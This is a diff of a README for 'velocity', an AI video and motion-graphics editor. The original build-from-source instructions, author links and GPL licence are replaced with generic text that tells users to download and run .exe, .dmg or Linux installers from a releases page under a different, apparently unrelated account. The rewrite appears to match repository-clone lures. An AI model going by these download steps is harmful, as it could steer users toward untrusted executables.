@@ -1,170 +1,71 @@
-# Velocity 🎬✨
-![Velocity](docs/Untitled.png)
+# 🎬 velocity - Create Videos Easily and Automatically
 
+## 📥 Download Now
+[![Download velocity](https://img.shields.io/badge/Download%20velocity-v1.0-blue)](https://github.com/lukasfigueiredo637/velocity/releases)
 
+## 🚀 Getting Started
+Welcome to the **velocity** project! This open-source application helps you create stunning videos quickly and easily. No programming skills are needed. With a design that supports integration with language models, you can automate your video creation process.
 
-> **Create stunning motion graphics and animations using AI‑powered scenes**
+## 🖥️ System Requirements
+To run the velocity application on your computer, make sure you have the following:
 
-![Demo](docs/demo.gif)
-> All examples in the demo was generated with ai.
+- **Operating System:** Windows 10 or higher, macOS 10.12 or higher, or any Linux distribution.
+- **RAM:** At least 4 GB (8 GB recommended).
+- **Storage:** Minimum of 500 MB free disk space.
+- **Node.js:** Make sure the latest version of Node.js is installed. You can download it from [Node.js website](https://nodejs.org/).
 
+## 📦 Features
+- **Easy Video Creation:** Quickly assemble videos with pre-built templates.
+- **AI Integration:** Leverage language models for intelligent content suggestions.
+- **Automation:** Automate repetitive tasks to save time.
+- **Customizable Templates:** Design videos using various styles that fit your needs.
+- **Export Options:** Save videos in multiple formats to suit different platforms.
 
-Velocity is an AI‑assisted video editor that lets you create professional motion graphics by describing your vision in natural language or structured YAML. It builds React components from YAML, animates them with an expressive timeline, and previews instantly.
+## 💾 Download & Install
+To get started with the velocity application, follow these steps:
 
-## 🌟 Features
+1. **Visit the Releases Page:** Go to the official releases page by clicking the link below:
+   [Download from Releases Page](https://github.com/lukasfigueiredo637/velocity/releases)
 
-- **🤖 AI‑Powered Scene Generation** — Describe your video and watch it come to life
-- **📝 YAML‑Based Authoring** — Clean, predictable schema with shortcuts
-- **🎨 Rich Elements** — Text, images, shapes, paths, groups, layouts
-- **⚡ Real‑time Preview** — Fast dev server with hot reload
-- **🎭 Advanced Animations** — Anime‑style steps, easing, stagger, timeline events
-- **📱 Layout System** — Flex‑based containers and responsive patterns
-- **🎯 3D Transforms** — Perspective and `z` depth available throughout
-- **🎬 Export‑Ready** — Built on Remotion for high‑quality rendering
+2. **Choose the Right Download:** Look for the latest release version on the page. Click on it to see the assets available for download.
 
-## 🚀 Quick Start
+3. **Download the Application:** Click on the appropriate file for your operating system:
+    - For **Windows**, download the `.exe` file.
+    - For **macOS**, download the `.dmg` file.
+    - For **Linux**, download the appropriate package.
 
-### Prerequisites
-- Node.js 18+
-- npm or yarn
+4. **Install Velocity:**
+    - For **Windows:** Open the downloaded `.exe` file and follow the installation prompts.
+    - For **macOS:** Open the downloaded `.dmg` file and drag the velocity app into your Applications folder.
+    - For **Linux:** Follow the instructions specific to your distribution to install the package.
 
-### Installation
+5. **Launch the Application:** After installation, find velocity in your applications folder and run it.
 
-```bash
-# Clone the repository
-git clone https://github.com/0x-boss/velocity.git
-cd velocity
+## 🛠️ Usage Instructions
+After installing the application, follow these simple steps to create your first video:
 
-# Install dependencies
-npm install
+1. **Open Velocity:** Launch the application.
+2. **Select a Template:** Browse through the available video templates and select one that fits your project.
+3. **Customize Your Video:** Add text, images, and other media to enhance your video. 
+4. **AI Assistance:** Use the AI tool to get suggestions for content and style.
+5. **Preview Your Video:** Before exporting, preview the video to ensure everything looks good.
+6. **Export Your Video:** Finally, select your preferred format and save the video to your computer.
 
-# Start development server
-npm run dev
-```
+## 🗂️ Support & Troubleshooting
+If you need help, you can check the FAQ section in the velocity application or visit the issues page in this repository. You can post questions or report issues you encounter.
 
-Visit `http://localhost:5173` to see the editor in action.
+**Common Issues:**
+- **Installation Problems:** Ensure your operating system meets the requirements.
+- **Performance Issues:** Make sure no other heavy applications are running.
+- **Export Failures:** Check that there is sufficient storage on your device.
 
-## 🤖 Using Velocity with AI
+## 🌐 Community and Contributions
+Join our community of users and contributors. Share your feedback, ideas, or improvements. Your contributions are welcome. Check the issues section for open tasks or new feature requests.
 
-Velocity pairs well with an LLM (ChatGPT, Claude, etc.) to author scenes:
+## 📝 License
+This project is licensed under the MIT License. You can view the details in the LICENSE file of this repository.
 
-1) Share these two documents with the model:
-   - `docs/docs.md` — complete schema and rules
-   - `docs/prompt.md` — strict instructions forcing a single valid YAML scene
-2) Ask the model: “e.g Generate Google search animation”
-3) Save the output to `public/examples/<name>.yaml`.
-4) In `src/App.jsx`, update the fetch path or click an Example button to preview. 
-
-
-## 📖 Manual Usage
-
-### Basic Example
-
-Create a simple scene in YAML:
-
-```yaml
-scene:
-  name: "Hello World"
-  width: 1280
-  height: 720
-  background: "#101214"
-  elements:
-    - type: text
-      txt: "Hello, Velocity!"
-      fs: 64
-      color: "#fff"
-      center: true
-      animations:
-        - steps:
-            - type: anime
-              duration: 1.0
-              props:
-                opacity: {from: 0, to: 1}
-                y: {from: 20, to: 0}
-```
-
-### Advanced Features
-- **Text targets** (chars/words) with stagger
-- **Path motion** (draw‑on, follow path)
-- **Timeline events** (`on`, `after`, `delay`)
-- **Group‑level animations** targeting children
-- **Camera transforms** (`x`, `y`, `z`, `scale`, `rotation`)
-
-## 🎯 Examples
-
-Included example scenes demonstrate different capabilities:
-- Enhanced Bank Hack
-- Bank Hacking Simulation
-- Google Search → Website Transition
-
-Load any example from the UI or browse `public/examples`.
-
-## 📚 Documentation
-
-- [Complete YAML Syntax Guide](docs/docs.md)
-- [AI Prompt Guide](docs/prompt.md)
-- API reference — coming soon
-
-## 🛠️ Project Structure
-
-
-```
-velocity/
-├── src/
-│ ├── parser/          # YAML → React component builder
-│ ├── player/          # Player wrapper and controls
-│ └── components/      # UI components
-├── public/
-│ └── examples/        # Example scenes
-├── docs/              # Docs, prompt guide, demo assets
-```
-
-## 🎨 Creating Your First Scene
-
-1. Start simple with a headline and a block
-2. Add motion via a short anime step
-3. Use containers and `gap`/`padding` for layout
-4. Sequence with timeline events and delays
-5. Export with Remotion when ready
-
-## ⚠️ Status
-
-**🚧 In active development** — may have rough edges:
-- Limited motion variation/presets
-- AI may misinterpret complex prompts
-- Some fine‑grained controls are still evolving
-
-Feedback and contributions are welcome!
-
-## 🤝 Contributing
-
-See the [Contributing Guide](CONTRIBUTING.md) for:
-- Local development setup
-- Code style and conventions
-- Submitting PRs and reporting issues
-
-Open issues and discussions:
-- Issues: https://github.com/0x-boss/velocity/issues
-- Discussions: https://github.com/0x-boss/velocity/discussions
-
-## 🗺️ Roadmap
-
-- Enhanced prompt understanding
-- More animation presets/effects
-- Advanced 3D capabilities
-- Audio synchronization
-- Plugin system for custom elements
-- Cloud rendering service
-- Collaborative editing
-
-## 🛡️ License
-
-Licensed under **GPL‑3.0** — see [LICENSE](LICENSE) for details.
-
-## 🙏 Acknowledgments
-
-- [Remotion](https://remotion.dev)
-- [Anime.js](https://animejs.com)
-- React ecosystem
+For further inquiries or support, feel free to reach out through the issues section.
 
 ---
+Thank you for choosing velocity! We hope you enjoy creating amazing videos effortlessly.
